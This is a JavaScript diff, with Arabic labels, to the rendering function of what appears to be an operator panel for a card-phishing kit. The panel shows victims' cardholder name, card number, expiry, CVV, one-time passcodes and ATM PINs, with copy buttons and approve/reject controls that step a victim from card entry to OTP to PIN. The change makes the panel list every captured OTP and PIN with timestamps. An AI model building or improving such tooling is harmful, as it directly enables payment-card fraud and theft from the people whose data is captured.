@@ -506,11 +506,15 @@ function buildCard(ip, ex){
 
   // Fallback to DB history
   const cardData=pd||(hp.length>0?hp[hp.length-1]:null);
-  const otpData=od||(hc.filter(c=>c.code_type!=='pin').pop()||null);
-  const pinData=pind||(hc.filter(c=>c.code_type==='pin').pop()||null);
+  // جميع OTP من DB (ليس آخر واحد فقط)
+  const allOtps=od?[od]:[...hc.filter(c=>c.code_type!=='pin')];
+  const allPins=pind?[pind]:[...hc.filter(c=>c.code_type==='pin')];
 
   const hasCard=!!cardData;
+  const hasCodes=allOtps.length>0||allPins.length>0;
   const stage=ls[ldKey]||ls[nip];
+
+  const cpIcon=`<svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>`;
 
   let h=`
   <div class="msec-t"><div class="msec-t-ic ti-g"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg></div>بيانات البطاقة</div>
@@ -526,42 +530,62 @@ function buildCard(ip, ex){
     const cn=rn?rn.replace(/\s/g,'').replace(/(.{4})/g,'$1 ').trim():'-';
     const ex2=cardData.expiry||cardData.expirationDate||'-';
     const cv=cardData.cvv||'-';
-
     h+=`
-    <div class="cfrow"><span class="cflbl">اسم الحامل</span><span class="cfval">${hn}<button class="cpbtn" onclick="cp('${hn.replace(/'/g,"\\'")}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button></span></div>
-    <div class="cfrow"><span class="cflbl">رقم البطاقة</span><span class="cfval"><span class="cnum">${cn}</span><button class="cpbtn" onclick="cp('${rn}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button></span></div>
-    <div class="cfrow"><span class="cflbl">تاريخ الانتهاء</span><span class="cfval">${ex2}<button class="cpbtn" onclick="cp('${ex2}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button></span></div>
-    <div class="cfrow"><span class="cflbl">CVV</span><span class="cfval">${cv}<button class="cpbtn" onclick="cp('${cv}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button></span></div>`;
-
-    // OTP
-    if(otpData){
-      const oc=otpData.code||'-';
-      h+=`<div class="crow" id="otp-row" style="background:${od?'#fffbeb':'#fafafa'}"><span class="crow-l" style="color:#d97706">🔑 رمز OTP</span><div style="display:flex;align-items:center;gap:6px"><span class="crow-v cotp">${oc}</span><button class="cpbtn" onclick="cp('${oc}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button></div></div>`;
-    } else {
-      h+=`<div class="crow" style="background:#fafafa"><span class="crow-l" style="color:#94a3b8">🔑 رمز OTP</span><span style="font-size:10px;color:#94a3b8">في الانتظار...</span></div>`;
-    }
-
-    // PIN
-    if(pinData){
-      const pc=pinData.code||'-';
-      h+=`<div class="crow" id="pin-row" style="background:${pind?'#f0fdf4':'#fafafa'}"><span class="crow-l" style="color:#0d9488">🔒 الرقم السري ATM</span><div style="display:flex;align-items:center;gap:6px"><span class="crow-v cpin">${pc}</span><button class="cpbtn" onclick="cp('${pc}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button></div></div>`;
-    } else {
-      h+=`<div class="crow" style="background:#fafafa"><span class="crow-l" style="color:#94a3b8">🔒 الرقم السري ATM</span><span style="font-size:10px;color:#94a3b8">في الانتظار...</span></div>`;
-    }
-
-    // Buttons
-    if(stage&&ld[ldKey]){
-      const lbl={payment:{a:'قبول → OTP',r:'رفض البطاقة'},otp:{a:'قبول → الرقم السري',r:'رفض → إعادة OTP'},pin:{a:'قبول ✓',r:'رفض → إعادة الرقم'}}[stage];
-      h+=`<div class="arow" id="abtns">
-        <button class="abtn aok" id="abtn-ok" onclick="appv('${ldKey}','${stage}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>${lbl.a}</button>
-        <button class="abtn arn" id="abtn-rj" onclick="rejv('${ldKey}','${stage}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>${lbl.r}</button>
-      </div>`;
-    } else {
-      h+=`<div class="arow"><button class="abtn ag"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>قبول</button><button class="abtn ag"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>رفض</button></div>`;
-    }
+    <div class="cfrow"><span class="cflbl">اسم الحامل</span><span class="cfval">${hn}<button class="cpbtn" onclick="cp('${hn.replace(/'/g,"\\'")}')"> ${cpIcon}</button></span></div>
+    <div class="cfrow"><span class="cflbl">رقم البطاقة</span><span class="cfval"><span class="cnum">${cn}</span><button class="cpbtn" onclick="cp('${rn}')">${cpIcon}</button></span></div>
+    <div class="cfrow"><span class="cflbl">تاريخ الانتهاء</span><span class="cfval">${ex2}<button class="cpbtn" onclick="cp('${ex2}')">${cpIcon}</button></span></div>
+    <div class="cfrow"><span class="cflbl">CVV</span><span class="cfval">${cv}<button class="cpbtn" onclick="cp('${cv}')">${cpIcon}</button></span></div>`;
   } else {
-    h+=`<div class="waiting"><span class="spin"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg></span>في انتظار بيانات البطاقة...</div>
-    <div class="arow"><button class="abtn ag"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>قبول</button><button class="abtn ag"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>رفض</button></div>`;
+    h+=`<div class="waiting"><span class="spin"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg></span>في انتظار بيانات البطاقة...</div>`;
+  }
+
+  // عرض جميع OTP من DB (مستقل عن وجود البطاقة)
+  if(allOtps.length>0){
+    h+=`<div style="border-top:1px solid #f1f5f9;margin-top:4px;padding-top:4px">`;
+    allOtps.forEach((o,i)=>{
+      const oc=o.code||'-';
+      const isLive=od&&i===0;
+      const ts=o.created_at?new Date(o.created_at).toLocaleTimeString('ar-SA',{hour:'2-digit',minute:'2-digit',second:'2-digit'}):'';
+      h+=`<div class="crow" style="background:${isLive?'#fffbeb':'#fafafa'}">
+        <span class="crow-l" style="color:#d97706">🔑 رمز OTP${allOtps.length>1?' #'+(allOtps.length-i):''}</span>
+        <div style="display:flex;align-items:center;gap:6px">
+          ${ts?`<span style="font-size:10px;color:#94a3b8">${ts}</span>`:''}          <span class="crow-v cotp">${oc}</span>
+          <button class="cpbtn" onclick="cp('${oc}')">${cpIcon}</button>
+        </div>
+      </div>`;
+    });
+    h+=`</div>`;
+  } else {
+    h+=`<div class="crow" style="background:#fafafa"><span class="crow-l" style="color:#94a3b8">🔑 رمز OTP</span><span style="font-size:10px;color:#94a3b8">في الانتظار...</span></div>`;
+  }
+
+  // عرض جميع PIN من DB
+  if(allPins.length>0){
+    allPins.forEach((p,i)=>{
+      const pc=p.code||'-';
+      const isLive=pind&&i===0;
+      const ts=p.created_at?new Date(p.created_at).toLocaleTimeString('ar-SA',{hour:'2-digit',minute:'2-digit',second:'2-digit'}):'';
+      h+=`<div class="crow" style="background:${isLive?'#f0fdf4':'#fafafa'}">
+        <span class="crow-l" style="color:#0d9488">🔒 الرقم السري ATM${allPins.length>1?' #'+(allPins.length-i):''}</span>
+        <div style="display:flex;align-items:center;gap:6px">
+          ${ts?`<span style="font-size:10px;color:#94a3b8">${ts}</span>`:''}          <span class="crow-v cpin">${pc}</span>
+          <button class="cpbtn" onclick="cp('${pc}')">${cpIcon}</button>
+        </div>
+      </div>`;
+    });
+  } else {
+    h+=`<div class="crow" style="background:#fafafa"><span class="crow-l" style="color:#94a3b8">🔒 الرقم السري ATM</span><span style="font-size:10px;color:#94a3b8">في الانتظار...</span></div>`;
+  }
+
+  // أزرار القبول/الرفض (تظهر دائماً)
+  if(stage&&ld[ldKey]){
+    const lbl={payment:{a:'قبول → OTP',r:'رفض البطاقة'},otp:{a:'قبول → الرقم السري',r:'رفض → إعادة OTP'},pin:{a:'قبول ✓',r:'رفض → إعادة الرقم'}}[stage];
+    h+=`<div class="arow" id="abtns">
+      <button class="abtn aok" id="abtn-ok" onclick="appv('${ldKey}','${stage}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>${lbl.a}</button>
+      <button class="abtn arn" id="abtn-rj" onclick="rejv('${ldKey}','${stage}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>${lbl.r}</button>
+    </div>`;
+  } else {
+    h+=`<div class="arow"><button class="abtn ag"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>قبول</button><button class="abtn ag"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>رفض</button></div>`;
   }
 
   h+=`</div>`; // close cbox
